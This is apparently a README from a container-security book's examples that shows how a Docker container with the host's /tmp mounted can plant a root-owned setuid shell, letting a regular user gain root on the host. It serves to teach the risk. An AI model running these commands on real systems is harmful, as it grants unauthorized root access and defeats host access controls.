# Use a container to create a setuid executable on the host

Run this example from the directory `container-security/chapter2/setuid`. 

```
# Build the C file into an executable, and then build the container image from the provided Dockerfile:
cc setuid-sh.c -lc -o setuid-sh
docker build -t setuid-sh -f setuid-sh.Dockerfile .

# Run the container, mounting the host's `/tmp` directory into the container:
docker run -v /tmp:/tmp setuid-sh
```

This copies an executable called `sh` into the `/tmp` directory on your host, with the setuid bit set.

```
ls -l /tmp/sh
```

You should see something like this: `-rwsr-xr-x 1 root root 16008 May  8 14:25 /tmp/sh`
Run this as a regular user:

```
# Run the executable 
/tmp/sh

# Inside this new shell, run whoami
whoami
```

You should see that you are now root, with access to everything on the host machine. 

Thanks to Ferry Boender for the inspiration in the post ["Root your Docker host in 10 seconds for fun and profit"](https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/)

[Back to chapter2](../README.md)

[Back to index](../../README.md)